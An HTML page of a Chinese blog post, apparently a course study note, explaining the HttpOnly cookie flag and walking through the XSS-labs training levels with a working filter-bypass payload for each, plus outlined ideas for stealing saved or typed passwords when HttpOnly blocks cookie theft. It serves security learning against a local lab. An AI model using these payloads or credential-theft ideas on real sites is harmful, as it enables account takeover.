@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Al0nez" />
+
+
+
+<meta name="description" content="HTTPOnly什么是HTTPOnly？如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击(攻击手法)，具体一点的介绍请google进行搜索">
+<meta property="og:type" content="article">
+<meta property="og:title" content="27WEB漏洞-XSS跨站之代码及httponly绕过">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Al0nez&#39;s Bolg">
+<meta property="og:description" content="HTTPOnly什么是HTTPOnly？如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击(攻击手法)，具体一点的介绍请google进行搜索">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117200.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117894.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117074.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117574.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117116.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117966.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117702.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117422.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117427.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117252.png">
+<meta property="article:published_time" content="2021-09-21T02:34:10.000Z">
+<meta property="article:modified_time" content="2021-09-21T03:28:20.735Z">
+<meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="小迪学习笔记">
+<meta property="article:tag" content="XSS跨站">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117200.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Al0nez&#39;s Bolg" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>27WEB漏洞-XSS跨站之代码及httponly绕过 | Al0nez&#39;s Bolg</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Al0nez</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Al0nez</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Al0nez</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-27WEB漏洞-XSS跨站之代码及httponly绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/" class="article-date">
+      <time datetime="2021-09-21T02:34:10.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      27WEB漏洞-XSS跨站之代码及httponly绕过
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS%E8%B7%A8%E7%AB%99/" rel="tag">XSS跨站</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">小迪学习笔记</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="HTTPOnly"><a href="#HTTPOnly" class="headerlink" title="HTTPOnly"></a>HTTPOnly</h3><h4 id="什么是HTTPOnly？"><a href="#什么是HTTPOnly？" class="headerlink" title="什么是HTTPOnly？"></a>什么是HTTPOnly？</h4><p>如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击(攻击手法)，具体一点的介绍请google进行搜索</p>
+<span id="more"></span>
+
+<h4 id="开启HTTPOnly"><a href="#开启HTTPOnly" class="headerlink" title="开启HTTPOnly"></a>开启HTTPOnly</h4><p>这里只介绍PHP如何开启。</p>
+<p>PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure>
+
+<p>设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br><span class="line">// or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>
+
+<p>对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>防止XSS读取cookie信息</p>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>将代码写入文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117200.png" alt="image-20210908203702609"></p>
+<p>当我们是用XSS语句进行盗取Cookie时，这里直接将XSS代码写到代码中。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117894.png" alt="image-20210908203857028"></p>
+<p>然后去查看XSS平台，可以看到Cookie没有被返回</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117074.png" alt="image-20210908203952045"></p>
+<h4 id="绕过HttpOnly"><a href="#绕过HttpOnly" class="headerlink" title="绕过HttpOnly"></a>绕过HttpOnly</h4><p>开启HttpOnly只会防止我们读取Cookie，而不会使我们XSS语句失效。如果对方开启了HttpOnly。除了可以通过获取Cookie来进行登录，还有一种方法就是通过账号和密码进行登录。</p>
+<p><strong>保存读取</strong></p>
+<p>如果对方在进行账号密码登录后，进行了浏览器保存。我们就可以利用XSS进行浏览器账号密码读取。</p>
+<img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117574.png" alt="image-20210908204924604" style="zoom:67%;" />
+
+<p><strong>未保存读取</strong></p>
+<p>如果对方在进行账号密码登录后，没有进行浏览器保存。我们可以采用表单劫持的方式，将对方输入的账号密码，发送一份给我们。这个攻击有一个前提条件，登录页面必须要有XSS漏洞。</p>
+<h3 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>查看代码发现。</p>
+<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><strong>PHP htmlspecialchars() 函数</strong></p>
+<p>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="显示结果"><a href="#显示结果" class="headerlink" title="显示结果"></a>显示结果</h5><p>将&lt;&gt;替换成了<code>&amp;lt;</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=&quot;center&quot;&gt;没有找到和&amp;lt;script&amp;gt;alet(1)&amp;lt;script&amp;gt;相关的结果.&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117116.png" alt="image-20210908211617873" style="zoom:67%;" />
+
+<p>我们发现下面一个标签中还有一个我们写的js语句，我们可以在前面写上”&gt;闭合前面的，就可以执行XSS代码了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>除了&lt;&gt;被过滤掉以后，”也被过滤掉了。我们在输入和第二关一样的代码时，双引号被代码实例化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 &amp;</li>
+<li>“ （双引号）成为 “</li>
+<li>‘ （单引号）成为 ‘</li>
+<li>&lt; （小于）成为 &lt;</li>
+<li>&gt; （大于）成为 &gt;</li>
+</ul>
+<h5 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h5><p><strong>HTML onclick 事件属性</strong></p>
+<p>当点击按钮时执行一段 JavaScript：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;copyText()&quot;&gt;Copy Text&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=&#x27;javascript:alert(/xss/)                  #onfocus聚焦事件</span><br><span class="line">&#x27; onfocus=&#x27;alert(/xss/) </span><br></pre></td></tr></table></figure>
+
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>和第3关一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>将on过滤了，过滤成o_n了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&quot; o_nfocus=&quot;javascript:alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h5><p>将XSS代码写成超链接形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>将href过滤了，可以通过大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>JavaScript的script替换为空了，所以我们双写绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>JavaScript的script过滤了，大小写没绕过，所以考虑编码绕过</p>
+<img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117966.png" alt="image-20210908214650837" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>//注释掉后面的<code>http://www.baidu.com</code>绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(/xss/)//http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>隐藏文本框，只有第三个有效</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117702.png" alt="image-20210908214904179"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level10.php?t_sort=&quot; type=&#x27;text&#x27; onfocus=&quot;alert(/xss/)&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><h5 id="知识-1"><a href="#知识-1" class="headerlink" title="知识"></a>知识</h5><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117422.png" alt="image-20210908220057180"></p>
+<h5 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h5><p>抓包，将Referer值修改为payload便能通过这一关</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117427.png" alt="image-20210329174228158"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><p>抓包，改一下UA值</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117252.png" alt="image-20210329174644639"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>抓包修改cookie值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>好像没得环境，这关利用的是exif漏洞，看这个exif的文章吧。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/104814749">https://blog.csdn.net/qq_32393893/article/details/104814749</a></p>
+<h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>XSS中有文件包含漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><p>禁掉了空格，用回车代替%0d</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=123%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>火狐和chrome很不一样。。。。chrome上可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level17.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>一样？？？？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level18.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>flash XSS chrome都把flash禁了，被淘汰了这flash，不做了不做了。(实际是因为懒)</p>
+<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h3><p>一样懒</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/">27WEB漏洞-XSS跨站之代码及httponly绕过</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
+        <p><span>发布时间:</span>2021-09-21, 10:34:10</p>
+        <p><span>最后更新:</span>2021-09-21, 11:28:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/" title="27WEB漏洞-XSS跨站之代码及httponly绕过">https://al0nez.github.io/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">
+                    28WEB漏洞-XSS跨站之WAF绕过及安全修复
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/">
+                    26WEB漏洞-XSS跨站之订单及Shell箱子反杀记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPOnly"><span class="toc-number">1.</span> <span class="toc-text">HTTPOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFHTTPOnly%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是HTTPOnly？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AFHTTPOnly"><span class="toc-number">1.2.</span> <span class="toc-text">开启HTTPOnly</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA"><span class="toc-number">1.4.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87HttpOnly"><span class="toc-number">1.5.</span> <span class="toc-text">绕过HttpOnly</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-labs"><span class="toc-number">2.</span> <span class="toc-text">XSS-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">2.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.2.</span> <span class="toc-text">第二关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E7%BB%93%E6%9E%9C"><span class="toc-number">2.2.2.</span> <span class="toc-text">显示结果</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.3.</span> <span class="toc-text">绕过</span></a></li></ol></li><li 